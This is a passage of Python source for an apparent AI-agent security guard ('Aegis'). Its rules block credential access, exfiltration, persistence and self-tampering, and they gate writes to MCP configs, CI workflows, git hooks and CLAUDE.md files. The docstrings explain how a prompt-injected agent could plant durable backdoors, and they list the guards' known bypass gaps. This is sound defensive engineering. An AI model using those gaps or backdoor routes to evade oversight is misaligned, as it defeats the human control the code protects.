"""Built-in, secure-by-default rules.

Each rule is ``(Event, Policy) -> Decision | None`` (None = no opinion); the engine
runs built-ins, then registered plugin rules, then the user's declarative rules,
first-deny-wins, fail-open per rule. Custom rules (orgs / MCP providers) use the
same signature and read ``policy`` for their own config — see ``aegis.plugins``.

Tiers: rogue-session gate + containment + self-protection are NOT escapable;
destructive git/delete are escapable with an explicit '# aegis-allow'.
"""
from __future__ import annotations

import fnmatch
import json
import os
import re
import subprocess
from typing import Optional

from . import normalize, patterns, review
from .events import ActionClass, Event, HookEvent
from .policy import Action, Decision

_URL_RE = re.compile(r"https?://([^/\s'\"]+)", re.IGNORECASE)


def _cmd(ev: Event) -> str:
    return str((ev.args or {}).get("command") or "")


def _path(ev: Event) -> str:
    a = ev.args or {}
    # Beyond Claude Code's own arg names, cover the common key names third-party
    # MCP filesystem-server tools use for their target path (varies by server —
    # e.g. target_file/filename/file/uri) so path-based guards see MCP-tool writes,
    # not just Edit/Write. Purely additive: widens detection, never narrows it.
    return str(a.get("file_path") or a.get("path") or a.get("notebook_path")
               or a.get("target_file") or a.get("targetFile") or a.get("filename")
               or a.get("file") or a.get("uri") or "")


def _is_shell(ev: Event) -> bool:
    return ev.action == ActionClass.SHELL


def _is_agent() -> bool:
    return bool(os.environ.get("AEGIS_AGENT_NAME"))


def _shell_scan(ev: Event) -> str:
    """De-obfuscated scan surface for a shell command — sees through quoting,
    encoding, and inner interpreters (bash -c / powershell -enc / base64 | sh)."""
    return normalize.scan_surface(_cmd(ev)) if _is_shell(ev) else ""


def _override_allowed(ev: Event, extra: str = "") -> bool:
    """The '# aegis-allow' / '-- aegis-allow' escape — honored ONLY for a human /
    orchestrator. A spawned agent (AEGIS_AGENT_NAME set) cannot wave itself past an
    escapable guard."""
    if _is_agent():
        return False
    return bool(patterns.OVERRIDE_RE.search(_cmd(ev) + " " + (extra or "")))


def _sql_text(ev: Event) -> str:
    """SQL/migration text from a DB tool's args (query/sql/statement/migration) and,
    for a shell call, the de-obfuscated command — so one rule covers psql AND a DB
    MCP tool, even when the SQL is wrapped/encoded."""
    a = ev.args or {}
    parts = [a.get("query"), a.get("sql"), a.get("statement"), a.get("migration")]
    if _is_shell(ev):
        parts.append(_shell_scan(ev))
    return " ".join(str(p) for p in parts if p)


def _flatten_strings(v, _depth: int = 0) -> list:
    """Every string/number leaf inside a (possibly nested) arg value. MCP tool
    args are arbitrary JSON, so a target URL can sit under any key name, at any
    depth (e.g. {"input": {"url": "..."}}) — QA review (independent agent,
    round 1) found a fixed key-name allowlist here was a bypass: any MCP tool
    naming its URL argument something other than the guessed set (url/query/
    uri/endpoint/command) sailed straight through untouched. Depth cap raised
    12 -> deep enough for any realistic tool-arg schema (round 3 QA found the
    original cap of 4 silently dropped a 5-level-deep target) while still
    bounding recursion against a pathological/cyclic payload."""
    if _depth > 12:
        return []
    if isinstance(v, str):
        return [v]
    if isinstance(v, (int, float)) and not isinstance(v, bool):
        return [str(v)]
    if isinstance(v, dict):
        out = []
        for x in v.values():
            out.extend(_flatten_strings(x, _depth + 1))
        return out
    if isinstance(v, (list, tuple)):
        out = []
        for x in v:
            out.extend(_flatten_strings(x, _depth + 1))
        return out
    return []


def _net_text(ev: Event) -> str:
    """All string/number argument content for a network-shaped tool call
    (WebFetch/WebSearch, or an MCP tool that reaches the network) — scans every
    value rather than a fixed set of key names, since the argument that carries
    the target URL varies by tool/server with no fixed convention across MCP
    servers."""
    return " ".join(_flatten_strings(ev.args or {}))


def _egress_host(ev: Event) -> Optional[str]:
    a = ev.args or {}
    for v in (a.get("url"), a.get("command"), a.get("query")):
        if v:
            m = _URL_RE.search(str(v))
            if m:
                return m.group(1).split("@")[-1].split(":")[0].lower()
    return None


# ---- rogue-session gate + honeypot: never escapable ----------------------------
def rule_attest_session(ev: Event, policy=None) -> Optional[Decision]:
    """On SessionStart, a process claiming an agent identity (AEGIS_AGENT_NAME)
    without a valid signed token is rogue. MONITOR by default (log + allow); under
    AEGIS_IDENTITY_ENFORCE the session is REAPED and the honeypot challenge surfaced."""
    if ev.event != HookEvent.SESSION_START:
        return None
    name = os.environ.get("AEGIS_AGENT_NAME")
    if not name:
        return None
    from . import identity
    if identity.current() is not None:
        return None
    from . import attest
    verdict = attest.classify({
        "agent": name,
        "model": os.environ.get("AEGIS_AGENT_MODEL"),
        "operator": os.environ.get("AEGIS_AGENT_OPERATOR"),
        "token": os.environ.get("AEGIS_AGENT_TOKEN"),
    })
    attest.record(verdict, source=os.environ.get("AEGIS_SESSION_ID") or name)
    if not identity.enforce_enabled():
        return None
    from . import reaper
    reaper.kill_session()
    return Decision(Action.DENY, "rogue-agent-reaped",
                    f"Rogue agent session terminated: claims identity '{name}' without a "
                    f"valid signed token. {attest.ATTEST_CHALLENGE}")


# ---- containment: never escapable ----------------------------------------------
def rule_containment(ev: Event, policy=None) -> Optional[Decision]:
    # Cloud-metadata SSRF is checked on a SEPARATE surface from the rest of this
    # function: only actions that actually reach the network (a shell command,
    # a WebFetch, or an MCP tool call) can trigger it. It deliberately does NOT
    # scan Read/Edit/Write path+content like CRED_RE does below — a file that
    # merely MENTIONS the address (docs, a firewall/NetworkPolicy rule that
    # blocks it, this guard's own tests) is not a fetch and must not be denied —
    # QA review (independent agent, round 1) caught this as a false positive
    # that would have made an Aegis-governed agent unable to even write about
    # the address it's supposed to protect against. WebSearch is excluded too
    # (round 2): a search QUERY never makes the agent's own network stack reach
    # an attacker-chosen host — the search provider does the fetching — so
    # "how does the 169.254.169.254 SSRF work" as research is not an attempt to
    # reach it and must not trip a non-escapable guard.
    #
    # The shell branch is a bare substring search (matching every other
    # containment pattern's style) EXCEPT for the narrow, closed-form
    # CLOUD_METADATA_MENTION_ONLY_RE carve-out (grep/git-commit/echo — see its
    # docstring in patterns.py for why a positive fetch-verb requirement was
    # tried and rejected: it under-blocks far worse than this over-blocks).
    # WebFetch/MCP need no carve-out: the tool call itself IS the fetch, so
    # mere presence of the address in its target argument is already the
    # attempt.
    is_shell = _is_shell(ev)
    if is_shell:
        text = _shell_scan(ev)
        metadata_hit = (bool(patterns.CLOUD_METADATA_RE.search(text))
                         and not patterns.CLOUD_METADATA_MENTION_ONLY_RE.search(text))
    elif ev.action == ActionClass.MCP or (
            ev.action == ActionClass.NET and (ev.tool or "").strip().lower() != "websearch"):
        metadata_hit = bool(patterns.CLOUD_METADATA_RE.search(_net_text(ev)))
        text = None  # handled above; not a shell/read/edit/write shape below
    elif ev.action in (ActionClass.READ, ActionClass.EDIT, ActionClass.WRITE):
        text = _path(ev) + " " + str((ev.args or {}).get("content") or "")
        metadata_hit = False
    else:
        return None
    if metadata_hit:
        return Decision(Action.DENY, "containment-cloud-metadata",
                        "Access to the cloud instance-metadata service is blocked — this "
                        "endpoint hands out live IAM/service-account credentials to "
                        "anything on-box, no auth required, and is a classic SSRF-to-"
                        "credential-theft path.")
    if text is None or not text.strip():
        return None
    if patterns.CRED_RE.search(text):
        return Decision(Action.DENY, "containment-credentials",
                        "Access to credential stores (SSH / cloud keys, browser logins, "
                        "OS vault) is blocked.")
    if _is_shell(ev) and patterns.PERSIST_RE.search(text):
        return Decision(Action.DENY, "containment-persistence",
                        "Installing persistence (autorun, scheduled tasks, services, "
                        "startup) is blocked.")
    if _is_shell(ev) and patterns.EXFIL_RE.search(text):
        return Decision(Action.DENY, "containment-exfiltration",
                        "Uploading local files to the network is blocked.")
    if _is_shell(ev) and patterns.CLOUD_EXFIL_RE.search(text):
        return Decision(Action.DENY, "containment-cloud-exfiltration",
                        "Uploading local files to a cloud storage bucket/container "
                        "(aws s3 / gsutil / az storage / rclone) is blocked.")
    if _is_shell(ev) and patterns.ENV_DUMP_EXFIL_RE.search(text):
        return Decision(Action.DENY, "containment-env-exfiltration",
                        "Dumping the process environment (env / printenv / export -p / "
                        "Get-ChildItem Env:) into a network call is blocked — the "
                        "environment routinely holds live secrets (API keys, tokens, "
                        "DATABASE_URL) with no file ever touched.")
    return None


# ---- self-protection: never escapable ----------------------------------------
def rule_self_protect(ev: Event, policy=None) -> Optional[Decision]:
    if _is_shell(ev):
        cmd = _shell_scan(ev)
        if patterns.AEGIS_UNINSTALL_RE.search(cmd):
            return Decision(Action.DENY, "self-protect",
                            "Running `aegis uninstall` is blocked.")
        if patterns.AEGIS_PULL_RE.search(cmd):
            return Decision(Action.DENY, "self-protect",
                            "Running `aegis pull` is blocked — overwriting policy from a "
                            "shell is a self-protect violation.")
        if (patterns.CONFIG_DIR_RE.search(cmd) or patterns.AEGIS_SOURCE_RE.search(cmd)
                # find's -path/-name predicates can name a protected file without the
                # command ever containing its path as one contiguous string — see
                # FIND_PROTECTED_RE's docstring in patterns.py. find_protected_hit(),
                # not a bare .search() on FIND_PROTECTED_RE alone — see FIND_WORD_RE's
                # comment in patterns.py for why this must stay a two-piece check.
                or patterns.find_protected_hit(cmd)) and (
                patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
                or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
                or patterns.WRITE_REDIRECT_RE.search(cmd)
                or patterns.COPY_WRITE_VERB_RE.search(cmd)
                # in-place edit (sed -i / perl -i / batch vim/ex) neither deletes,
                # moves, redirects, nor copies-over — it was the one write shape this
                # guard didn't check, letting an agent rewrite policy/settings/source
                # in place without tripping "never escapable" self-protection.
                or patterns.INPLACE_WRITE_RE.search(cmd)):
            return Decision(Action.DENY, "self-protect",
                            "Writing/deleting/moving Aegis's own config, policy, or engine "
                            "source is blocked.")
        return None
    if ev.action in (ActionClass.EDIT, ActionClass.WRITE):
        p = _path(ev)
        if patterns.ENFORCEMENT_PATH_RE.search(p) or patterns.AEGIS_SOURCE_RE.search(p):
            return Decision(Action.DENY, "self-protect",
                            "Editing Aegis's own config or engine source is blocked.")
        if patterns.AEGIS_SKILL_PATH_RE.search(p):
            return Decision(Action.DENY, "self-protect",
                            "Editing Aegis's shipped skills (.claude/skills/aegis-*) is "
                            "blocked — they carry the compliance guidance blocked agents "
                            "are pointed at.")
    return None


# ---- MCP server-config protection: escapable with human confirmation ---------
def _mcp_config_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_mcp_config_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block writes to MCP server-definition config files (``.mcp.json``,
    ``~/.claude.json``'s ``mcpServers``, and the Cursor/VS Code/Windsurf/Claude
    Desktop equivalents) and CLI ``mcp add`` registration.

    A server entry's ``command``/``args``/``url``/``env`` is auto-executed on every
    FUTURE session start. A hijacked or prompt-injected agent that plants or edits
    one plants a durable, cross-session backdoor — via a plain Edit/Write, an MCP
    filesystem tool, a shell redirect/delete/in-place-edit/copy onto the path, or a
    CLI's own ``mcp add`` subcommand (which mutates the config without any file write
    the Edit/Write hook would see). Distinct from self-protect (Aegis's own config)
    and containment/persistence (OS-level only) — neither covers this surface.

    Config (``policy.mcp_config``): ``mode`` (deny|ask|monitor|off, default deny),
    ``allow`` (regexes on the path/command that skip the gate — a repo's own trusted
    setup script, say). ``ask`` surfaces the change to a human for interactive
    approval (like ``install_review``) instead of a hard deny; ``monitor`` logs the
    would-be decision to the audit and allows.

    Escapable only by a human: a trailing '# aegis-allow' on the *shell* form (the
    natural place for it — there's no syntax-safe way to embed a comment inside a
    JSON Edit/Write payload), or the env toggle ``AEGIS_ALLOW_MCP_CONFIG=1`` set by
    the orchestrator/human before launch for the Edit/Write/MCP-tool form. A spawned
    agent cannot set its own env for a hook invocation it doesn't control, so neither
    path is agent-self-escapable."""
    cfg = getattr(policy, "mcp_config", None) or {}
    mode = str(cfg.get("mode", "deny")).lower()
    if mode == "off":
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        if not p or not patterns.MCP_CONFIG_PATH_RE.search(p):
            return None
        if os.environ.get("AEGIS_ALLOW_MCP_CONFIG") or _mcp_config_allowed_by_policy(cfg, p):
            return None
        would = Decision(action, "mcp-config-protect",
                         f"MCP server config '{p}' is being written — a new or "
                         "modified server entry (command/args/url/env) runs "
                         "automatically on every future session, a durable backdoor. "
                         "Review the change, then confirm with "
                         "AEGIS_ALLOW_MCP_CONFIG=1; a spawned agent cannot set this.")
        if mode == "monitor":
            _record_monitor(ev, would, "mcp-config-protect-monitor")
            return None
        return would

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        touches_config = bool(patterns.MCP_CONFIG_PATH_RE.search(cmd)) and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd))
        cli_add = patterns.MCP_CLI_ADD_RE.search(cmd)
        if not (touches_config or cli_add):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_MCP_CONFIG")
                or _mcp_config_allowed_by_policy(cfg, _cmd(ev))):
            return None
        would = Decision(action, "mcp-config-protect",
                         "MCP server configuration is being modified from a shell — "
                         "this can register a new tool server that runs "
                         "automatically on every future session. A human may append "
                         "'# aegis-allow', or set AEGIS_ALLOW_MCP_CONFIG=1; a spawned "
                         "agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "mcp-config-protect-monitor")
            return None
        return would
    return None


# ---- CI/CD workflow-definition protection: escapable with human confirmation --
def _ci_workflow_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_ci_workflow_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering a CI/CD pipeline-definition file (GitHub Actions
    workflows and composite actions, GitLab CI, CircleCI, Azure Pipelines, Travis,
    Jenkinsfile, Drone, Bitbucket Pipelines, Buildkite, Cloud Build, AppVeyor).

    A pipeline step runs autonomously on a FUTURE, DIFFERENT machine (the CI
    runner) that typically holds MORE privilege than the current session (deploy
    keys, cloud IAM, publish tokens, a write-scoped GITHUB_TOKEN, org secrets). A
    hijacked or prompt-injected agent that plants or edits a step here — a
    secret-exfiltrating `run:` line, a `pull_request_target` trigger over
    untrusted fork code, a step that leaks `${{ secrets.* }}` into a log/artifact
    — plants a backdoor that never executes in THIS guarded session at all (no
    shell/network guard here ever sees it fire) and self-triggers on the next
    push/PR/build with no further agent action needed. Distinct from
    mcp_config_protect (same-machine, next-session auto-exec) and
    self-protect/containment (this session/host only) — neither covers a payload
    that only runs on a remote CI runner later.

    Config (``policy.ci_workflow``): ``mode`` (deny|ask|monitor|off, default ask),
    ``allow`` (regexes on the path/command that skip the gate — a repo's own
    trusted bot-authored dependency-bump PRs, say). Defaults to ``ask`` rather than
    a hard deny (unlike mcp_config_protect, which defaults to deny) because editing
    a CI workflow is routine, common dev work — bumping an action version, adding a
    test-matrix entry — unlike planting an MCP server, which is rare; ``ask`` keeps
    a human in the loop on every change (the agent never decides — see README) with
    no pre-session setup required, the same reasoning ``rule_install_review`` uses
    for defaulting to ``ask`` over ``deny``. ``deny`` is still available for a
    stricter posture; ``monitor`` logs the would-be decision to the audit and
    allows.

    Escapable only by a human: a trailing '# aegis-allow' on the *shell* form, or
    the env toggle ``AEGIS_ALLOW_CI_WORKFLOW=1`` set by the orchestrator/human
    before launch for the Edit/Write/MCP-tool form. A spawned agent cannot set its
    own env for a hook invocation it doesn't control, so neither path is
    agent-self-escapable."""
    cfg = getattr(policy, "ci_workflow", None) or {}
    mode = str(cfg.get("mode", "ask")).lower()
    if mode == "off":
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        if not p or not patterns.CI_WORKFLOW_PATH_RE.search(p):
            return None
        if os.environ.get("AEGIS_ALLOW_CI_WORKFLOW") or _ci_workflow_allowed_by_policy(cfg, p):
            return None
        would = Decision(action, "ci-workflow-protect",
                         f"CI/CD pipeline definition '{p}' is being written — a step "
                         "added here runs on a FUTURE CI run, on a different machine, "
                         "typically with more privilege (deploy keys, cloud IAM, a "
                         "write-scoped GITHUB_TOKEN) than this session. Review the "
                         "change, then confirm with AEGIS_ALLOW_CI_WORKFLOW=1; a "
                         "spawned agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "ci-workflow-protect-monitor")
            return None
        return would

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        # CI_WORKFLOW_FIND_RE catches `find -path/-name/-regex` naming the target
        # without ever writing its path as one contiguous string (same reason
        # rule_self_protect pairs FIND_PROTECTED_RE alongside its own path
        # patterns — see that pattern's docstring). FORCED_LINK_WRITE_RE catches
        # `ln -f`/`New-Item -Force`, a write shape none of the other four verb
        # patterns below recognize (QA finding, round 1).
        names_workflow = bool(patterns.CI_WORKFLOW_PATH_RE.search(cmd)
                               or patterns.ci_workflow_find_hit(cmd))
        touches_workflow = names_workflow and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd)
            or patterns.FORCED_LINK_WRITE_RE.search(cmd))
        if not touches_workflow:
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_CI_WORKFLOW")
                or _ci_workflow_allowed_by_policy(cfg, _cmd(ev))):
            return None
        would = Decision(action, "ci-workflow-protect",
                         "CI/CD pipeline configuration is being modified from a shell "
                         "— a step added here runs on a future CI run, on a different "
                         "machine, typically with more privilege than this session. A "
                         "human may append '# aegis-allow', or set "
                         "AEGIS_ALLOW_CI_WORKFLOW=1; a spawned agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "ci-workflow-protect-monitor")
            return None
        return would
    return None


# ---- git-hooks protection: escapable with human confirmation -----------------
def _git_hooks_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_git_hooks_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering a Git hook (``.git/hooks/pre-commit``, ``pre-push``,
    ``post-checkout``, ...) and redirecting git to an attacker-controlled hooks
    directory via ``core.hooksPath``.

    A hook runs with the invoking user's full privileges on the very next
    matching git operation — the human's next commit/push/checkout, not just
    this session — with no further agent action needed, the same "runs later,
    unattended" shape as ``rule_mcp_config_protect`` (next-session auto-exec) and
    ``rule_ci_workflow_protect`` (next-CI-run auto-exec). Worse than either: a
    file under ``.git/hooks/`` is NEVER tracked by git itself, so it has no diff,
    shows in no ``git status``, and survives no code review — the most invisible
    durable backdoor of the three. ``core.hooksPath`` is a second, independent
    path to the same outcome: it redirects git to run hooks from an arbitrary
    directory the agent staged a script in beforehand, so a bare path check on
    ``.git/hooks/`` alone cannot see it — a ``--global``/``--system`` scoped
    redirect widens the blast radius to every repo the human ever touches.

    Config (``policy.git_hooks``): ``mode`` (deny|ask|monitor|off, default ask),
    ``allow`` (regexes on the path/command that skip the gate — a repo's own
    trusted ``pre-commit install``/husky setup, say). Defaults to ``ask`` for the
    same reason ``rule_ci_workflow_protect`` does: installing a pre-commit/husky
    hook is routine, sanctioned dev work, unlike planting an MCP server.

    Escapable only by a human: a trailing '# aegis-allow' on the *shell* form, or
    the env toggle ``AEGIS_ALLOW_GIT_HOOKS=1`` set by the orchestrator/human
    before launch for the Edit/Write/MCP-tool form. A spawned agent cannot set
    its own env for a hook invocation it doesn't control, so neither path is
    agent-self-escapable.

    Honest scope: this is a path-string match on the standard hook directory
    (including a submodule's real `.git/modules/<name>/hooks/` location) and
    hook names (see ``patterns.py`` for the full githooks(5) list) plus a
    ``core.hooksPath`` command/content match — the same denylist trade-offs as
    every other guard in this file (``find``-indirection, forced-link swaps,
    and archive/sync tools (rsync/tar/unzip/`install -m`) are covered the way
    ``rule_ci_workflow_protect``'s equivalents are). Known residual gaps, same
    spirit as this file's other disclosed denylist limits: a hook name outside
    the standard set; a shell command that computes the hook path indirectly
    across variable assignments; an MCP tool naming its target argument
    outside ``_path()``'s recognized key list; a fully relocated git dir via
    ``--separate-git-dir``/a `.git` pointer file with no "modules" in the
    path; and ``GIT_CONFIG_GLOBAL``/``GIT_CONFIG_SYSTEM`` redirecting to a
    payload staged in an EARLIER, separate tool call (Aegis evaluates each
    call independently — see ``GIT_HOOKS_CONFIG_INI_RE``'s comment in
    ``patterns.py``)."""
    cfg = getattr(policy, "git_hooks", None) or {}
    # YAML 1.1 parses an unquoted `off` as boolean False — accept both
    # spellings, the same fix `rule_failure_loop` already applies for its own
    # `mode` knob (QA finding, independent adversarial review, round 1: this
    # guard silently stayed ACTIVE — fails safe, not open, but still a
    # config-hygiene bug worth closing).
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        hook_hit = bool(p and patterns.GIT_HOOKS_PATH_RE.search(p))
        a = ev.args or {}
        content = str(a.get("content") or a.get("new_string") or "")
        config_hit = False
        if content:
            # Path-independent: a full "[core] ... hookspath =" block is
            # high-signal regardless of destination filename — see
            # GIT_HOOKS_CONFIG_INI_RE's comment in patterns.py for why.
            if patterns.GIT_HOOKS_CONFIG_INI_RE.search(content):
                config_hit = True
            elif p and patterns.GIT_CONFIG_FILE_PATH_RE.search(p) and (
                    patterns.GIT_HOOKS_CONFIG_CONTENT_RE.search(content)):
                config_hit = True
        if not (hook_hit or config_hit):
            return None
        if os.environ.get("AEGIS_ALLOW_GIT_HOOKS") or _git_hooks_allowed_by_policy(cfg, p):
            return None
        reason = (f"Git hook '{p}' is being written" if hook_hit
                  else f"'{p}' is being written with a core.hooksPath redirect")
        would = Decision(action, "git-hooks-protect",
                         f"{reason} — a hook script runs automatically, with the "
                         "invoking user's full privileges, on the very next matching "
                         "git operation, and (unlike a tracked file) is invisible to "
                         "`git diff`/`git status`/code review. Review the change, "
                         "then confirm with AEGIS_ALLOW_GIT_HOOKS=1; a spawned agent "
                         "cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "git-hooks-protect-monitor")
            return None
        return would

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        names_hook = bool(patterns.GIT_HOOKS_PATH_RE.search(cmd)
                           or patterns.GIT_HOOKS_DIR_RE.search(cmd)
                           or patterns.git_hooks_find_hit(cmd))
        touches_hook = names_hook and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd)
            or patterns.FORCED_LINK_WRITE_RE.search(cmd)
            or patterns.GIT_HOOKS_ARCHIVE_VERB_RE.search(cmd))
        config_redirect = bool(patterns.GIT_HOOKS_CONFIG_RE.search(cmd))
        if not (touches_hook or config_redirect):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_GIT_HOOKS")
                or _git_hooks_allowed_by_policy(cfg, _cmd(ev))):
            return None
        reason = ("Git hook configuration is being modified from a shell" if touches_hook
                  else "git's hooksPath is being redirected from a shell")
        would = Decision(action, "git-hooks-protect",
                         f"{reason} — a hook script runs automatically, with the "
                         "invoking user's full privileges, on the very next matching "
                         "git operation, and (unlike a tracked file) is invisible to "
                         "`git diff`/`git status`/code review. A human may append "
                         "'# aegis-allow', or set AEGIS_ALLOW_GIT_HOOKS=1; a spawned "
                         "agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "git-hooks-protect-monitor")
            return None
        return would
    return None


# ---- agent-instructions / agent-definition protection: escapable with human --
def _agent_def_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_agent_def_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering project instructions (``CLAUDE.md``/``AGENTS.md``,
    including the ``.local`` supplement variants) or a custom agent/command/
    output-style definition (``.claude/agents/*.md``, ``.claude/commands/*.md``,
    ``.claude/output-styles/*.md``, project- or user-scoped).

    ``CLAUDE.md``/``AGENTS.md`` is folded directly into the model's OWN context
    on every FUTURE session start — the same "runs later, unattended" shape as
    ``rule_mcp_config_protect``, except the payload is natural-language
    instructions merged straight into the system prompt rather than a shelled-
    out command, and it persists across every sub-agent spawned in that future
    session too. Its fuse is shorter than ``rule_ci_workflow_protect``'s/
    ``rule_git_hooks_protect``'s: those need an EXTERNAL future trigger (a
    push, a commit) before the payload runs; a nested-directory ``CLAUDE.md``
    can self-trigger WITHIN the same session, the instant the agent's cwd
    moves into that subtree, no human action in between at all. ``ask`` is
    still the right default (below), not ``deny`` — but this asymmetry is
    exactly why it's disclosed here rather than silently inherited. A
    ``.claude/agents/*.md`` sub-agent whose description reads like "use
    PROACTIVELY" is auto-selected by the orchestrator with no explicit
    per-invocation human choice, and routinely carries its own tool allowlist
    (up to ``tools: "*"``) independent of whatever gated the session that
    planted it — privilege escalation via a natural-language file, not code.
    A ``.claude/commands/*.md``/``.claude/output-styles/*.md`` definition only
    takes effect when a human explicitly invokes/selects it, but the human is
    trusting the NAME each time, not re-reading the file's body — the same
    "trusted name, unread body" trap ``rule_ci_workflow_protect``/
    ``rule_git_hooks_protect`` exist for.

    NOT new coverage (QA correction, independent adversarial review, round 1
    — an earlier draft of this docstring overstated this): a shell-based
    delete/redirect/in-place-edit under ``.claude/`` — which includes
    ``.claude/agents/*``/``.claude/commands/*``/``.claude/output-styles/*`` —
    was ALREADY denied, non-escapably, by ``rule_self_protect``'s broad
    ``CONFIG_DIR_RE`` match; this guard's shell branch is a redundant, weaker
    (``ask``, escapable) second layer there, not new ground. What actually IS
    new: (1) a root/nested ``CLAUDE.md``/``AGENTS.md`` in EITHER form (shell
    or Edit/Write) — no ``.claude`` substring, so ``CONFIG_DIR_RE`` never
    fires on it; (2) a plain ``Edit``/``Write``/MCP-tool call (no shell) to
    ANY of these paths — self-protect's own EDIT/WRITE branch checks only
    ``ENFORCEMENT_PATH_RE``/``AEGIS_SOURCE_RE``/``AEGIS_SKILL_PATH_RE``, never
    the broader ``CONFIG_DIR_RE``.

    Config (``policy.agent_def``): ``mode`` (deny|ask|monitor|off, default
    ask), ``allow`` (regexes on the path/command that skip the gate — a
    repo's own CI-authored ``CLAUDE.md`` sync, say). Defaults to ``ask`` for
    the same reason ``rule_ci_workflow_protect``/``rule_git_hooks_protect``
    do: editing project instructions or authoring a custom sub-agent/command
    is routine, sanctioned dev work, unlike e.g. planting an MCP server.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_AGENT_DEF=1`` set by the orchestrator/
    human before launch for the Edit/Write/MCP-tool form. A spawned agent
    cannot set its own env for a hook invocation it doesn't control, so
    neither path is agent-self-escapable.

    Honest scope: a path-string match, the same denylist trade-offs as every
    other guard in this file. `AGENT_DEF_DIR_RE` + `ARCHIVE_SYNC_VERB_RE`
    close the archive/sync-tool bypass (`rsync`/`tar`/`unzip`/`install -m`
    placing a file with no verb this guard's other checks recognize, and no
    filename ever named as one contiguous string) the same way
    `GIT_HOOKS_DIR_RE`/`GIT_HOOKS_ARCHIVE_VERB_RE` close it for git hooks —
    a fix that QA (independent adversarial review, round 1) found was never
    carried over from that guard despite this one being modeled on it.
    Known residual gaps, same spirit as every guard in this file: a direct
    fetch-to-file write (`curl -o CLAUDE.md ...`, `wget -O ... `) with no
    verb any of the five write-verb checks (or the archive/sync check)
    recognizes — an inherited gap `rule_ci_workflow_protect`/
    `rule_git_hooks_protect` share too, not new or worse here; a project-
    instructions filename outside the recognized set; an MCP filesystem tool
    naming its target argument outside ``_path()``'s recognized key list;
    nesting past 4 levels under `.claude/agents|commands|output-styles`
    evading the filename form of `AGENT_DEF_PATH_RE` (the bare-directory
    backstop above still catches an archive/sync tool's own target argument
    regardless of nesting); and a shell command that computes the target path
    indirectly across separate variable assignments (the ``find``-indirection
    case is covered; a `for`/`xargs` loop or `basename`/`dirname`
    reconstruction is not, the same disclosed gap
    ``rule_self_protect``/``rule_ci_workflow_protect``/
    ``rule_git_hooks_protect`` already carry)."""
    cfg = getattr(policy, "agent_def", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        instr_hit = bool(p and patterns.AGENT_INSTRUCTIONS_PATH_RE.search(p))
        def_hit = bool(p and patterns.AGENT_DEF_PATH_RE.search(p))
        if not (instr_hit or def_hit):
            return None
        if os.environ.get("AEGIS_ALLOW_AGENT_DEF") or _agent_def_allowed_by_policy(cfg, p):
            return None
        reason = (f"Project instructions file '{p}' is being written — its content is "
                   "folded directly into every future session's context, unattended"
                   if instr_hit else
                   f"Agent/command/output-style definition '{p}' is being written — it "
                   "can be auto-selected or invoked in a future session, carrying its "
                   "own tool allowlist")
        would = Decision(action, "agent-def-protect",
                         f"{reason}. Review the change, then confirm with "
                         "AEGIS_ALLOW_AGENT_DEF=1; a spawned agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "agent-def-protect-monitor")
            return None
        return would

    if _is_shell(ev):
        cmd = _shell_scan(ev)
